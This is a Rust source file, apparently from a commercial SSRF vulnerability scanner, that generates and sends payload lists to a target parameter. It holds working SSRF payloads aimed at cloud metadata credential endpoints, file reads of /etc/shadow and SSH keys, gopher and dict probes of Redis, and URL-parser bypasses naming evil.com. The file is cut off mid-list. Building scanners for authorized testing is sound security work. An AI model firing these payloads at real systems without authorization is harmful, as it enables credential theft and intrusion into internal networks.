// Copyright (c) 2026 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

/**
 * Bountyy Oy - Enterprise SSRF (Server-Side Request Forgery) Scanner
 * TRULY Advanced SSRF detection with 2000+ generated payloads
 *
 * Features:
 * - Programmatic payload generation (not just hardcoded lists)
 * - ALL IP encoding variations (decimal, octal, hex, mixed, IPv6)
 * - 127.0.0.1 has 100+ representations alone
 * - Complete cloud metadata coverage (AWS IMDSv1/v2, GCP, Azure, DO, Alibaba, Oracle, Hetzner)
 * - DNS rebinding with multiple services
 * - Protocol handlers (file, gopher, dict, ldap, tftp, etc.)
 * - URL parser differential attacks
 * - Double/triple encoding
 * - Unicode homoglyph attacks
 * - IPv6 variations and embeddings
 *
 * @copyright 2026 Bountyy Oy
 * @license Proprietary - Enterprise Edition
 */
use crate::detection_helpers::AppCharacteristics;
use crate::http_client::{HttpClient, HttpResponse};
use crate::oob_detector::{OobDetector, OobVulnType};
use crate::scanners::parameter_filter::{ParameterFilter, ScannerType};
use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
use anyhow::Result;
use futures::stream::{self, StreamExt};
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use std::sync::Arc;
use tokio::sync::Mutex;
use tracing::{debug, info};

/// SSRF bypass category for classification
#[derive(Debug, Clone, PartialEq)]
pub enum SsrfBypassCategory {
    CloudMetadata,
    CloudMetadataImdsv2,
    IpObfuscation,
    DnsRebinding,
    UrlParserDifferential,
    ProtocolSmuggling,
    Ipv6Bypass,
    EncodingBypass,
    WhitelistBypass,
    InternalNetwork,
    LocalhostBypass,
    RedirectBypass,
    PortScan,
    DnsExfiltration,
    CloudServices,
    ContainerMetadata,
    PdfGenerator,
    ImageProcessor,
    UrlPreview,
    WebhookSsrf,
}

impl SsrfBypassCategory {
    fn as_str(&self) -> &str {
        match self {
            Self::CloudMetadata => "Cloud Metadata",
            Self::CloudMetadataImdsv2 => "Cloud Metadata IMDSv2",
            Self::IpObfuscation => "IP Obfuscation",
            Self::DnsRebinding => "DNS Rebinding",
            Self::UrlParserDifferential => "URL Parser Differential",
            Self::ProtocolSmuggling => "Protocol Smuggling",
            Self::Ipv6Bypass => "IPv6 Bypass",
            Self::EncodingBypass => "Encoding Bypass",
            Self::WhitelistBypass => "Whitelist Bypass",
            Self::InternalNetwork => "Internal Network",
            Self::LocalhostBypass => "Localhost Bypass",
            Self::RedirectBypass => "Redirect Bypass",
            Self::PortScan => "Port Scan",
            Self::DnsExfiltration => "DNS Exfiltration",
            Self::CloudServices => "Cloud Services",
            Self::ContainerMetadata => "Container Metadata",
            Self::PdfGenerator => "PDF Generator SSRF",
            Self::ImageProcessor => "Image Processor SSRF",
            Self::UrlPreview => "URL Preview/Unfurling SSRF",
            Self::WebhookSsrf => "Webhook SSRF",
        }
    }
}

/// SSRF payload with metadata
struct SsrfPayload {
    payload: String,
    category: SsrfBypassCategory,
    description: String,
    severity: Severity,
}

pub struct SsrfScanner {
    http_client: Arc<HttpClient>,
}

impl SsrfScanner {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        Self { http_client }
    }

    /// Scan a parameter for SSRF vulnerabilities
    pub async fn scan_parameter(
        &self,
        base_url: &str,
        parameter: &str,
        _config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        if !crate::license::verify_scan_authorized() {
            return Ok((Vec::new(), 0));
        }
        if !crate::signing::is_scan_authorized() {
            tracing::warn!("SSRF scan blocked: No valid scan authorization");
            return Ok((Vec::new(), 0));
        }

        // Smart parameter filtering - SSRF needs URL/callback parameters
        if ParameterFilter::should_skip_parameter(parameter, ScannerType::SSRF) {
            debug!("[SSRF] Skipping non-URL parameter: {}", parameter);
            return Ok((Vec::new(), 0));
        }

        info!(
            "[SSRF] Enterprise scanner - testing parameter: {} (priority: {})",
            parameter,
            ParameterFilter::get_parameter_priority(parameter)
        );

        let baseline = match self.http_client.get(base_url).await {
            Ok(response) => response,
            Err(e) => {
                debug!("Failed to get baseline for SSRF testing: {}", e);
                return Ok((Vec::new(), 0));
            }
        };

        // Check if this is GraphQL/JSON API - use focused payloads
        let characteristics = AppCharacteristics::from_response(&baseline, base_url);
        let is_json_api = characteristics.is_api
            || baseline
                .headers
                .get("content-type")
                .map(|ct| ct.contains("application/json") || ct.contains("application/graphql"))
                .unwrap_or(false);

        // Generate payloads based on license tier and context
        let payloads = if is_json_api {
            info!("[SSRF] JSON API detected - using focused SSRF payloads (cloud metadata + localhost)");
            self.generate_focused_api_payloads()
        } else if crate::license::is_feature_available("enterprise_ssrf") {
            self.generate_enterprise_payloads()
        } else if crate::license::is_feature_available("ssrf_scanning") {
            self.generate_professional_payloads()
        } else {
            self.generate_basic_payloads()
        };

        let total_payloads = payloads.len();
        info!("[SSRF] Testing {} generated payloads", total_payloads);

        // Shared state for early termination
        let found_vuln = Arc::new(AtomicBool::new(false));
        let tests_completed = Arc::new(AtomicUsize::new(0));
        let vulnerabilities = Arc::new(Mutex::new(Vec::new()));
        let baseline = Arc::new(baseline);

        // High concurrency for fast scanning (200 concurrent requests)
        let concurrent_requests = 200;

        stream::iter(payloads)
            .for_each_concurrent(concurrent_requests, |ssrf_payload| {
                let url = base_url.to_string();
                let param = parameter.to_string();
                let client = Arc::clone(&self.http_client);
                let found_vuln = Arc::clone(&found_vuln);
                let tests_completed = Arc::clone(&tests_completed);
                let vulnerabilities = Arc::clone(&vulnerabilities);
                let baseline = Arc::clone(&baseline);

                async move {
                    // Early termination - skip if we already found a vulnerability
                    if found_vuln.load(Ordering::Relaxed) {
                        return;
                    }

                    let test_url = if url.contains('?') {
                        format!(
                            "{}&{}={}",
                            url,
                            param,
                            urlencoding::encode(&ssrf_payload.payload)
                        )
                    } else {
                        format!(
                            "{}?{}={}",
                            url,
                            param,
                            urlencoding::encode(&ssrf_payload.payload)
                        )
                    };

                    match client.get(&test_url).await {
                        Ok(response) => {
                            tests_completed.fetch_add(1, Ordering::Relaxed);

                            if let Some(vuln) = Self::analyze_ssrf_response_static(
                                &response,
                                &ssrf_payload,
                                &param,
                                &test_url,
                                &baseline,
                            ) {
                                info!(
                                    "[ALERT] SSRF vulnerability detected via {}",
                                    ssrf_payload.category.as_str()
                                );
                                found_vuln.store(true, Ordering::Relaxed);
                                let mut vulns = vulnerabilities.lock().await;
                                vulns.push(vuln);
                            }
                        }
                        Err(e) => {
                            debug!("SSRF test error: {}", e);
                        }
                    }
                }
            })
            .await;

        // Extract results from Arc<Mutex<Vec>>
        let final_vulns = match Arc::try_unwrap(vulnerabilities) {
            Ok(mutex) => mutex.into_inner(),
            Err(arc) => {
                let guard = arc.lock().await;
                guard.clone()
            }
        };
        let tests_run = tests_completed.load(Ordering::Relaxed);

        info!(
            "[SUCCESS] [SSRF] Completed {} tests, found {} vulnerabilities",
            tests_run,
            final_vulns.len()
        );
        Ok((final_vulns, tests_run))
    }

    // ========================================================================
    // IP ADDRESS ENCODING GENERATORS
    // These generate ALL variations, not just examples
    // ========================================================================

    /// Generate all IP encoding variations for a given IP
    fn generate_ip_variations(&self, ip: &str) -> Vec<String> {
        let mut variations = Vec::new();
        let parts: Vec<u8> = ip.split('.').filter_map(|p| p.parse().ok()).collect();
        if parts.len() != 4 {
            return vec![ip.to_string()];
        }

        let (a, b, c, d) = (parts[0], parts[1], parts[2], parts[3]);

        // Standard dotted decimal
        variations.push(format!("{}.{}.{}.{}", a, b, c, d));

        // Full decimal (dword)
        let decimal = ((a as u32) << 24) | ((b as u32) << 16) | ((c as u32) << 8) | (d as u32);
        variations.push(format!("{}", decimal));

        // Full hexadecimal
        variations.push(format!("0x{:08x}", decimal));
        variations.push(format!("0x{:X}", decimal));

        // Full octal
        variations.push(format!("0{:o}", decimal));

        // Dotted hex
        variations.push(format!("0x{:02x}.0x{:02x}.0x{:02x}.0x{:02x}", a, b, c, d));
        variations.push(format!("0x{:x}.0x{:x}.0x{:x}.0x{:x}", a, b, c, d));

        // Dotted octal
        variations.push(format!("0{:o}.0{:o}.0{:o}.0{:o}", a, b, c, d));
        variations.push(format!("{:03o}.{:03o}.{:03o}.{:03o}", a, b, c, d));

        // Mixed representations
        variations.push(format!("{}.{}.0x{:x}.{}", a, b, c, d));
        variations.push(format!("0x{:x}.{}.{}.{}", a, b, c, d));
        variations.push(format!("{}.0{:o}.{}.{}", a, b, c, d));
        variations.push(format!("{}.{}.{}.0x{:x}", a, b, c, d));
        variations.push(format!("0{:o}.{}.{}.{}", a, b, c, d));
        variations.push(format!("{}.0x{:x}.0{:o}.{}", a, b, c, d));

        // Shortened forms (where applicable)
        if a == 127 && b == 0 && c == 0 && d == 1 {
            variations.push("127.1".to_string());
            variations.push("127.0.1".to_string());
            variations.push("127.0.0.1".to_string());
        }

        // IPv6 mapped IPv4
        variations.push(format!("[::ffff:{}.{}.{}.{}]", a, b, c, d));
        variations.push(format!("[::ffff:{:x}{:02x}:{:x}{:02x}]", a, b, c, d));
        variations.push(format!("[0:0:0:0:0:ffff:{}.{}.{}.{}]", a, b, c, d));

        // URL encoded variations
        let ip_str = format!("{}.{}.{}.{}", a, b, c, d);
        variations.push(ip_str.replace(".", "%2e"));
        variations.push(format!("%31%32%37%2e%30%2e%30%2e%31")); // URL encoded 127.0.0.1

        // Double URL encoded
        variations.push(ip_str.replace(".", "%252e"));

        // Bracketed IPv6 style
        variations.push(format!("[::{}.{}.{}.{}]", a, b, c, d));

        variations
    }

    /// Generate localhost variations (100+ representations of 127.0.0.1)
    fn generate_localhost_variations(&self) -> Vec<String> {
        let mut variations = Vec::new();

        // All IP encoding variations
        variations.extend(self.generate_ip_variations("127.0.0.1"));

        // DNS names that resolve to localhost
        let localhost_dns = vec![
            "localhost",
            "localhost.localdomain",
            "localhost4",
            "localhost4.localdomain4",
            "localhost6",
            "localhost6.localdomain6",
            "ip6-localhost",
            "ip6-loopback",
            "localtest.me",  // Resolves to 127.0.0.1
            "lvh.me",        // Resolves to 127.0.0.1
            "vcap.me",       // Resolves to 127.0.0.1
            "lacolhost.com", // Resolves to 127.0.0.1
            "127.0.0.1.nip.io",
            "127.0.0.1.sslip.io",
            "127.0.0.1.xip.io",
            "www.127.0.0.1.nip.io",
            "customer1.app.127.0.0.1.nip.io",
        ];
        variations.extend(localhost_dns.iter().map(|s| s.to_string()));

        // IPv6 localhost
        let ipv6_localhost = vec![
            "[::1]",
            "[0:0:0:0:0:0:0:1]",
            "[0000:0000:0000:0000:0000:0000:0000:0001]",
            "[::0:1]",
            "[::0:0:1]",
            "[::0:0:0:1]",
            "[0::1]",
            "[0:0::1]",
            "[0:0:0::1]",
        ];
        variations.extend(ipv6_localhost.iter().map(|s| s.to_string()));

        // Zero IP variations (often routes to localhost)
        let zero_ip = vec![
            "0.0.0.0",
            "0",
            "0x0",
            "00",
            "0.0.0.0:80",
            "0.0.0.0:443",
            "[::0]",
            "[::]",
        ];
        variations.extend(zero_ip.iter().map(|s| s.to_string()));

        // Additional encoding tricks
        variations.push("①②⑦.⓪.⓪.①".to_string()); // Unicode circled numbers
        variations.push("127。0。0。1".to_string()); // Fullwidth dots

        variations
    }

    /// Generate cloud metadata IP variations
    fn generate_metadata_variations(&self) -> Vec<String> {
        let mut variations = Vec::new();

        // AWS/Azure/DO/Oracle metadata IP: 169.254.169.254
        variations.extend(self.generate_ip_variations("169.254.169.254"));

        // Additional metadata IPs
        variations.extend(self.generate_ip_variations("100.100.100.200")); // Alibaba
        variations.extend(self.generate_ip_variations("168.63.129.16")); // Azure Wire Server

        // GCP metadata hostname
        let gcp_hosts = vec![
            "metadata.google.internal",
            "metadata",
            "metadata.google.internal.",
        ];
        variations.extend(gcp_hosts.iter().map(|s| s.to_string()));

        variations
    }

    /// Generate all cloud metadata endpoints
    fn generate_cloud_metadata_payloads(&self) -> Vec<SsrfPayload> {
        let mut payloads = Vec::new();
        let metadata_ips = self.generate_metadata_variations();

        // AWS endpoints
        let aws_paths = vec![
            "/latest/meta-data/",
            "/latest/meta-data/iam/security-credentials/",
            "/latest/meta-data/iam/security-credentials/admin",
            "/latest/meta-data/iam/security-credentials/root",
            "/latest/meta-data/iam/security-credentials/default",
            "/latest/meta-data/iam/security-credentials/ec2-role",
            "/latest/user-data/",
            "/latest/dynamic/instance-identity/document",
            "/latest/dynamic/instance-identity/pkcs7",
            "/latest/dynamic/instance-identity/signature",
            "/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
            "/latest/meta-data/hostname",
            "/latest/meta-data/local-ipv4",
            "/latest/meta-data/local-hostname",
            "/latest/meta-data/public-ipv4",
            "/latest/meta-data/public-hostname",
            "/latest/meta-data/ami-id",
            "/latest/meta-data/instance-id",
            "/latest/meta-data/instance-type",
            "/latest/meta-data/placement/availability-zone",
            "/latest/meta-data/placement/region",
            "/latest/meta-data/network/interfaces/macs/",
            "/latest/meta-data/security-groups",
            "/latest/meta-data/public-keys/0/openssh-key",
            "/latest/api/token",
        ];

        // Generate payloads for AWS with all IP variations
        for ip in &metadata_ips {
            if ip.contains("169.254.169.254")
                || ip.contains("2852039166")
                || ip.contains("0xa9fea9fe")
                || ip.parse::<u32>().is_ok()
            {
                for path in &aws_paths {
                    payloads.push(SsrfPayload {
                        payload: format!("http://{}{}", ip, path),
                        category: SsrfBypassCategory::CloudMetadata,
                        description: format!("AWS metadata via {}", ip),
                        severity: Severity::Critical,
                    });
                }
            }
        }

        // GCP endpoints
        let gcp_paths = vec![
            "/computeMetadata/v1/",
            "/computeMetadata/v1/instance/",
            "/computeMetadata/v1/instance/service-accounts/",
            "/computeMetadata/v1/instance/service-accounts/default/token",
            "/computeMetadata/v1/instance/service-accounts/default/email",
            "/computeMetadata/v1/instance/service-accounts/default/scopes",
            "/computeMetadata/v1/project/",
            "/computeMetadata/v1/project/project-id",
            "/computeMetadata/v1/project/numeric-project-id",
            "/computeMetadata/v1/instance/zone",
            "/computeMetadata/v1/instance/machine-type",
            "/computeMetadata/v1/instance/hostname",
            "/computeMetadata/v1/instance/network-interfaces/",
            "/computeMetadata/v1/instance/attributes/",
            "/computeMetadata/v1/instance/attributes/kube-env",
            "/computeMetadata/v1/instance/attributes/ssh-keys",
        ];

        for host in &["metadata.google.internal", "metadata", "169.254.169.254"] {
            for path in &gcp_paths {
                payloads.push(SsrfPayload {
                    payload: format!("http://{}{}", host, path),
                    category: SsrfBypassCategory::CloudMetadata,
                    description: format!("GCP metadata via {}", host),
                    severity: Severity::Critical,
                });
            }
        }

        // Azure endpoints
        let azure_paths = vec![
            "/metadata/instance?api-version=2021-02-01",
            "/metadata/instance?api-version=2020-09-01",
            "/metadata/instance?api-version=2019-08-15",
            "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net",
            "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/",
            "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://database.windows.net/",
            "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/",
            "/metadata/instance/compute?api-version=2021-02-01",
            "/metadata/instance/network?api-version=2021-02-01",
            "/metadata/instance/compute/subscriptionId?api-version=2021-02-01&format=text",
            "/metadata/instance/compute/resourceGroupName?api-version=2021-02-01&format=text",
        ];

        for path in &azure_paths {
            for ip in &metadata_ips {
                payloads.push(SsrfPayload {
                    payload: format!("http://{}{}", ip, path),
                    category: SsrfBypassCategory::CloudMetadata,
                    description: "Azure IMDS".to_string(),
                    severity: Severity::Critical,
                });
            }
        }

        // Azure Wire Server
        let wire_paths = vec![
            "/machine?comp=goalstate",
            "/machine/plugins?comp=config&type=hostingEnvironmentConfig",
            "/machine/plugins?comp=config&type=SharedConfig",
        ];
        for path in &wire_paths {
            payloads.push(SsrfPayload {
                payload: format!("http://168.63.129.16{}", path),
                category: SsrfBypassCategory::CloudMetadata,
                description: "Azure Wire Server".to_string(),
                severity: Severity::Critical,
            });
        }

        // DigitalOcean
        let do_paths = vec![
            "/metadata/v1.json",
            "/metadata/v1/",
            "/metadata/v1/hostname",
            "/metadata/v1/region",
            "/metadata/v1/interfaces/public/0/ipv4/address",
            "/metadata/v1/dns/nameservers",
        ];
        for path in &do_paths {
            payloads.push(SsrfPayload {
                payload: format!("http://169.254.169.254{}", path),
                category: SsrfBypassCategory::CloudMetadata,
                description: "DigitalOcean metadata".to_string(),
                severity: Severity::Critical,
            });
        }

        // Oracle Cloud
        let oracle_paths = vec![
            "/opc/v1/instance/",
            "/opc/v1/identity/",
            "/opc/v2/instance/",
            "/opc/v2/identity/",
        ];
        for path in &oracle_paths {
            payloads.push(SsrfPayload {
                payload: format!("http://169.254.169.254{}", path),
                category: SsrfBypassCategory::CloudMetadata,
                description: "Oracle Cloud metadata".to_string(),
                severity: Severity::Critical,
            });
        }

        // Alibaba
        let alibaba_paths = vec![
            "/latest/meta-data/",
            "/latest/meta-data/ram/security-credentials/",
            "/latest/meta-data/instance-id",
            "/latest/meta-data/region-id",
        ];
        for path in &alibaba_paths {
            payloads.push(SsrfPayload {
                payload: format!("http://100.100.100.200{}", path),
                category: SsrfBypassCategory::CloudMetadata,
                description: "Alibaba Cloud metadata".to_string(),
                severity: Severity::Critical,
            });
        }

        // AWS ECS/Fargate
        payloads.push(SsrfPayload {
            payload: "http://169.254.170.2/v2/credentials".to_string(),
            category: SsrfBypassCategory::CloudMetadata,
            description: "AWS ECS credentials".to_string(),
            severity: Severity::Critical,
        });
        payloads.push(SsrfPayload {
            payload: "http://169.254.170.2/v2/metadata".to_string(),
            category: SsrfBypassCategory::CloudMetadata,
            description: "AWS ECS metadata".to_string(),
            severity: Severity::Critical,
        });

        // Kubernetes / Container metadata
        let k8s_payloads = vec![
            (
                "http://kubernetes.default.svc/api/v1/namespaces/default/secrets",
                "K8s secrets",
            ),
            (
                "http://kubernetes.default.svc/api/v1/namespaces/default/pods",
                "K8s pods",
            ),
            (
                "http://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets",
                "K8s kube-system secrets",
            ),
            ("http://kubernetes.default.svc:443/api/v1/", "K8s API"),
            ("https://kubernetes.default.svc/api/v1/", "K8s API HTTPS"),
            ("http://rancher-metadata/", "Rancher metadata"),
            (
                "http://rancher-metadata/latest/self/container",
                "Rancher container",
            ),
        ];
        for (url, desc) in k8s_payloads {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::ContainerMetadata,
                description: desc.to_string(),
                severity: Severity::Critical,
            });
        }

        payloads
    }

    /// Generate localhost-based SSRF payloads
    fn generate_localhost_payloads(&self) -> Vec<SsrfPayload> {
        let mut payloads = Vec::new();
        let localhost_variations = self.generate_localhost_variations();

        // Common ports to test
        let ports = vec![
            ("", "default port"),
            (":80", "HTTP"),
            (":443", "HTTPS"),
            (":8080", "HTTP alt"),
            (":8000", "HTTP alt 8000"),
            (":8443", "HTTPS alt"),
            (":3000", "Node/Rails"),
            (":5000", "Flask"),
            (":9000", "PHP-FPM"),
            (":22", "SSH"),
            (":3306", "MySQL"),
            (":5432", "PostgreSQL"),
            (":6379", "Redis"),
            (":27017", "MongoDB"),
            (":9200", "Elasticsearch"),
            (":11211", "Memcached"),
            (":2375", "Docker API"),
            (":2376", "Docker TLS"),
        ];

        for host in &localhost_variations {
            for (port, desc) in &ports {
                payloads.push(SsrfPayload {
                    payload: format!("http://{}{}/", host, port),
                    category: SsrfBypassCategory::LocalhostBypass,
                    description: format!("Localhost {} via {}", desc, host),
                    severity: Severity::High,
                });
            }
        }

        payloads
    }

    /// Generate internal network SSRF payloads
    fn generate_internal_network_payloads(&self) -> Vec<SsrfPayload> {
        let mut payloads = Vec::new();

        // RFC 1918 private ranges - sample IPs
        let internal_ips = vec![
            "10.0.0.1",
            "10.0.0.100",
            "10.0.0.254",
            "10.1.0.1",
            "10.1.1.1",
            "10.10.10.10",
            "10.255.255.1",
            "10.255.255.254",
            "172.16.0.1",
            "172.16.0.100",
            "172.16.0.254",
            "172.17.0.1",
            "172.18.0.1",
            "172.19.0.1",
            "172.31.0.1",
            "172.31.255.254",
            "192.168.0.1",
            "192.168.0.100",
            "192.168.0.254",
            "192.168.1.1",
            "192.168.1.100",
            "192.168.1.254",
            "192.168.2.1",
            "192.168.10.1",
            "192.168.100.1",
        ];

        // Common internal hostnames
        let internal_hosts = vec![
            "internal",
            "intranet",
            "localhost",
            "backend",
            "api",
            "api.internal",
            "db",
            "database",
            "mysql",
            "postgres",
            "redis",
            "elasticsearch",
            "consul",
            "vault",
            "jenkins",
            "gitlab",
            "jira",
            "confluence",
            "splunk",
            "grafana",
            "prometheus",
            "kibana",
            "admin",
            "management",
        ];

        let ports = vec![
            "", ":80", ":8080", ":443", ":8443", ":9200", ":6379", ":3306",
        ];

        for ip in &internal_ips {
            for port in &ports {
                payloads.push(SsrfPayload {
                    payload: format!("http://{}{}/", ip, port),
                    category: SsrfBypassCategory::InternalNetwork,
                    description: format!("Internal IP {}", ip),
                    severity: Severity::High,
                });
            }
        }

        for host in &internal_hosts {
            for port in &ports {
                payloads.push(SsrfPayload {
                    payload: format!("http://{}{}/", host, port),
                    category: SsrfBypassCategory::InternalNetwork,
                    description: format!("Internal host {}", host),
                    severity: Severity::High,
                });
            }
        }

        payloads
    }

    /// Generate protocol smuggling payloads
    fn generate_protocol_payloads(&self) -> Vec<SsrfPayload> {
        let mut payloads = Vec::new();

        // File protocol payloads
        let file_paths = vec![
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/etc/hostname",
            "/etc/resolv.conf",
            "/etc/issue",
            "/etc/motd",
            "/etc/group",
            "/proc/self/environ",
            "/proc/self/cmdline",
            "/proc/self/status",
            "/proc/version",
            "/proc/net/fib_trie",
            "/proc/net/arp",
            "/proc/net/tcp",
            "/proc/net/udp",
            "/proc/mounts",
            "/root/.ssh/id_rsa",
            "/root/.ssh/id_dsa",
            "/root/.ssh/authorized_keys",
            "/root/.bash_history",
            "/root/.mysql_history",
            "/var/log/apache2/access.log",
            "/var/log/apache2/error.log",
            "/var/log/nginx/access.log",
            "/var/log/nginx/error.log",
            "/var/log/auth.log",
            "/var/log/syslog",
            "/home/user/.ssh/id_rsa",
            "/home/user/.bash_history",
            // Windows
            "c:/windows/win.ini",
            "c:/windows/system.ini",
            "c:/windows/system32/drivers/etc/hosts",
            "c:/boot.ini",
            "c:/inetpub/logs/logfiles",
        ];

        for path in &file_paths {
            payloads.push(SsrfPayload {
                payload: format!("file://{}", path),
                category: SsrfBypassCategory::ProtocolSmuggling,
                description: format!("File read {}", path),
                severity: Severity::Critical,
            });
            payloads.push(SsrfPayload {
                payload: format!("file://localhost{}", path),
                category: SsrfBypassCategory::ProtocolSmuggling,
                description: format!("File localhost {}", path),
                severity: Severity::Critical,
            });
        }

        // Gopher protocol payloads (can interact with various services)
        let gopher_payloads = vec![
            ("gopher://127.0.0.1:6379/_INFO", "Gopher Redis INFO"),
            (
                "gopher://127.0.0.1:6379/_CONFIG%20GET%20*",
                "Gopher Redis CONFIG",
            ),
            ("gopher://127.0.0.1:6379/_KEYS%20*", "Gopher Redis KEYS"),
            ("gopher://127.0.0.1:11211/_stats", "Gopher Memcached"),
            (
                "gopher://127.0.0.1:11211/_version",
                "Gopher Memcached version",
            ),
            ("gopher://127.0.0.1:25/_HELO%20localhost", "Gopher SMTP"),
            ("gopher://127.0.0.1:3306/", "Gopher MySQL"),
            ("gopher://127.0.0.1:5432/", "Gopher PostgreSQL"),
        ];
        for (url, desc) in gopher_payloads {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::ProtocolSmuggling,
                description: desc.to_string(),
                severity: Severity::Critical,
            });
        }

        // Dict protocol
        let dict_payloads = vec![
            ("dict://127.0.0.1:6379/info", "Dict Redis"),
            ("dict://127.0.0.1:11211/stats", "Dict Memcached"),
        ];
        for (url, desc) in dict_payloads {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::ProtocolSmuggling,
                description: desc.to_string(),
                severity: Severity::High,
            });
        }

        // Other protocols
        let other_protocols = vec![
            ("ldap://127.0.0.1:389/", "LDAP"),
            ("ldap://localhost/", "LDAP localhost"),
            ("tftp://127.0.0.1/", "TFTP"),
            ("ftp://127.0.0.1/", "FTP"),
            ("ftp://anonymous@127.0.0.1/", "FTP anonymous"),
            ("sftp://127.0.0.1/", "SFTP"),
            ("netdoc:///etc/passwd", "Netdoc"),
            ("jar:http://127.0.0.1/test.jar!/", "JAR protocol"),
        ];
        for (url, desc) in other_protocols {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::ProtocolSmuggling,
                description: desc.to_string(),
                severity: Severity::High,
            });
        }

        payloads
    }

    /// Generate URL parser bypass payloads
    fn generate_url_parser_payloads(&self) -> Vec<SsrfPayload> {
        let mut payloads = Vec::new();

        // These target differences in URL parsing between validators and backend
        let parser_tricks = vec![
            // Credential section bypass
            (
                "http://evil.com@169.254.169.254/latest/meta-data/",
                "@ credential bypass",
            ),
            ("http://169.254.169.254@evil.com/", "@ reversed"),
            ("http://169.254.169.254%40evil.com/", "Encoded @"),
            ("http://evil.com:80@169.254.169.254/", "Port in creds"),
            (
                "http://evil.com:password@169.254.169.254/",
                "Password in creds",
            ),
            // Fragment bypass
            ("http://169.254.169.254#@evil.com/", "Fragment #@"),
            ("http://evil.com#.169.254.169.254/", "Fragment with dot"),
            // Backslash (Windows path separator)
            ("http://169.254.169.254\\@evil.com/", "Backslash bypass"),
            ("http://evil.com\\169.254.169.254/", "Backslash path"),
            // Tab/newline
            ("http://169.254.169.254%09/latest/meta-data/", "Tab in URL"),
            ("http://169.254.169.254%0d/latest/meta-data/", "CR in URL"),
            ("http://169.254.169.254%0a/latest/meta-data/", "LF in URL"),
            (
                "http://169.254.169.254%0d%0a/latest/meta-data/",
                "CRLF in URL",
            ),
            // Unicode dots and slashes
            ("http://169。254。169。254/", "Unicode fullwidth dots"),
            ("http://169．254．169．254/", "Unicode halfwidth dots"),
            (
                "http://169%E3%80%82254%E3%80%82169%E3%80%82254/",
                "Encoded unicode dots",
            ),
            // Double/triple slashes
            ("http:///169.254.169.254/", "Triple slash"),
            ("http:\\\\169.254.169.254/", "Double backslash"),
            // Case manipulation
            ("HTTP://169.254.169.254/", "Uppercase protocol"),
            ("hTtP://169.254.169.254/", "Mixed case protocol"),
            // Path normalization
            ("http://169.254.169.254/./latest/meta-data/", "Dot in path"),
            (
                "http://169.254.169.254/../169.254.169.254/latest/meta-data/",
                "Dotdot path",
            ),
            (
                "http://169.254.169.254//latest//meta-data/",
                "Double slash path",
            ),
        ];

        for (url, desc) in parser_tricks {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::UrlParserDifferential,
                description: desc.to_string(),
                severity: Severity::High,
            });
        }

        payloads
    }

    /// Generate DNS rebinding payloads
    fn generate_dns_rebinding_payloads(&self) -> Vec<SsrfPayload> {
        let mut payloads = Vec::new();

        // DNS rebinding services
        let rebind_payloads = vec![
            (
                "http://A.127.0.0.1.1time.169.254.169.254.1time.repeat.rebind.network/",
                "rebind.network to metadata",
            ),
            (
                "http://make-127-0-0-1-and-169-254-169-254-rr.1u.ms/",
                "1u.ms rebind",
            ),
            (
                "http://make-169-254-169-254-rebind-127-0-0-1-rr.1u.ms/",
                "1u.ms rebind reversed",
            ),
            ("http://7f000001.c0a80001.rbndr.us/", "rbndr.us rebind"),
            ("http://localtest.me/", "localtest.me"),
            ("http://127.0.0.1.nip.io/", "nip.io localhost"),
            ("http://169.254.169.254.nip.io/", "nip.io metadata"),
            ("http://127.0.0.1.sslip.io/", "sslip.io localhost"),
            ("http://169.254.169.254.sslip.io/", "sslip.io metadata"),
            ("http://127.0.0.1.xip.io/", "xip.io localhost"),
            ("http://lvh.me/", "lvh.me"),
            ("http://vcap.me/", "vcap.me"),
        ];

        for (url, desc) in rebind_payloads {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::DnsRebinding,
                description: desc.to_string(),
                severity: Severity::High,
            });
        }

        payloads
    }

    /// Generate AWS IMDSv2 payloads (requires token from PUT request)
    /// IMDSv2 requires a token obtained via PUT to /latest/api/token with TTL header
    fn generate_imdsv2_payloads(&self) -> Vec<SsrfPayload> {
        let mut payloads = Vec::new();
        let metadata_ips = vec!["169.254.169.254", "0xa9fea9fe", "2852039166"];

        // IMDSv2 token endpoint - requires PUT with header X-aws-ec2-metadata-token-ttl-seconds
        for ip in &metadata_ips {
            payloads.push(SsrfPayload {
                payload: format!("http://{}/latest/api/token", ip),
                category: SsrfBypassCategory::CloudMetadataImdsv2,
                description: "AWS IMDSv2 token endpoint (requires PUT)".to_string(),
                severity: Severity::Critical,
            });
        }

        // IMDSv2-protected endpoints (require X-aws-ec2-metadata-token header)
        let imdsv2_paths = vec![
            "/latest/meta-data/",
            "/latest/meta-data/iam/security-credentials/",
            "/latest/user-data/",
            "/latest/dynamic/instance-identity/document",
        ];

        for ip in &metadata_ips {
            for path in &imdsv2_paths {
                payloads.push(SsrfPayload {
                    payload: format!("http://{}{}", ip, path),
                    category: SsrfBypassCategory::CloudMetadataImdsv2,
                    description: "AWS IMDSv2 protected endpoint".to_string(),
                    severity: Severity::Critical,
                });
            }
        }

        payloads
    }

    /// Generate PDF Generator SSRF payloads
    /// Tests various HTML/SVG injection vectors for PDF generation tools
    fn generate_pdf_generator_payloads(&self) -> Vec<SsrfPayload> {
        let mut payloads = Vec::new();

        // wkhtmltopdf payloads - iframe, img, link injection
        let html_payloads = vec![
            (
                r#"<html><body><iframe src="http://169.254.169.254/latest/meta-data/"></iframe></body></html>"#,
                "wkhtmltopdf iframe metadata",
            ),
            (
